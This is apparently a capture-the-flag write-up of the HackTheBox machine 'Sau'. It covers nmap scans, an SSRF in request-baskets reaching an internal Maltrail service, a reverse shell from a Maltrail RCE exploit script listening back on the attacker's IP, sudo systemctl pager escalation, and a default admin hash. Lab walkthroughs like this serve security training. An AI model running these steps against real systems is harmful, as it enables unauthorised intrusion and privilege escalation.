# Sau

# User Flag

## NMAP Enumeration

All Port Scan:

```bash
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
12394/tcp filtered unknown no-response
13091/tcp filtered unknown no-response
19721/tcp filtered unknown no-response
25327/tcp filtered unknown no-response
53819/tcp filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
64901/tcp filtered unknown no-response
```


All Open Port Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-open-ports-nmap-report 10.10.11.224

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
55555/tcp open  unknown syn-ack ttl 63
```



NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.11.224 -p 22

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
12394/tcp closed   unknown
13091/tcp closed   unknown
19721/tcp closed   unknown
25327/tcp closed   unknown
53819/tcp closed   unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 07 Aug 2024 18:04:36 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 07 Aug 2024 18:04:09 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 07 Aug 2024 18:04:09 GMT
|_    Content-Length: 0
64901/tcp closed   unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=8/7%Time=66B3B717%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html
SF:;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2007\x20Aug\x
SF:202024\x2018:04:09\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"
SF:/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x2
SF:0200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Wed,\x2007\x20Aug\x
SF:202024\x2018:04:09\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nDate:\x20Wed,\x2007\x20Aug\x202024\x2018:04:36\x20GMT
SF:\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20n
SF:ame\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\
SF:$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration (Port 55555)

There is a web application hosted on port 55555. It allows a user to create a basket to collect and inspect HTTP requests. 

Notes:

* Website is powered by `request-baskets | Version: 1.2.1` and source code looks to be available on [github](https://github.com/darklynx/request-baskets).
* There is [CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163) available for this version of `request baskets` software.
* The CVE is for SSRF vulnerability, which can allow us to access internal services hosted on ports that are not accessible to external users (i.e. filtered ports 80 and 8338).
* The vulnerability works due to us being able to setup a Forward URL that forwards our request to the server. We can also enable proxy response, which will then return any response back to the client. The "Insecure TLS" set to true will bypass certificate verification and "Expand Path" set to true makes the forwared url path expanded when the original http request contains a compound path. Sending a request with the configuration below returns the application hosted on port 80 and 8338. 

![SSRF](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Sau/Images/SSRF.png)

* Found application Maltrail (v0.53) hosted on port 80.

![Maltrail](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Sau/Images/Maltrail%20Application.png)

* Application has RCE vulnerability which can be exploited using script from [here](https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main).

```bash
# exploit script
python3 exploit.py 10.10.14.47 443 http://10.10.11.224:55555/n5wtoms

# netcat listening
nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.224] 42082
$
```

Can now get the user flag:

```bash
$ ls -lar
ls -lar
total 876
-rw-r----- 1 root puma     33 Aug  7 16:46 user.txt
```

# Root flag

Checking sudo permissions returns the following:

```bash
puma@sau:/opt/maltrail$ sudo -l

Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

This can be exploited to spawn a shell ([article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#spawn-shell-in-the-pager))

Check the `maltrail.conf` file and found default password for admin:

```bash
admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:0:                        # changeme!
```

Hash decodes to `changeme!`.













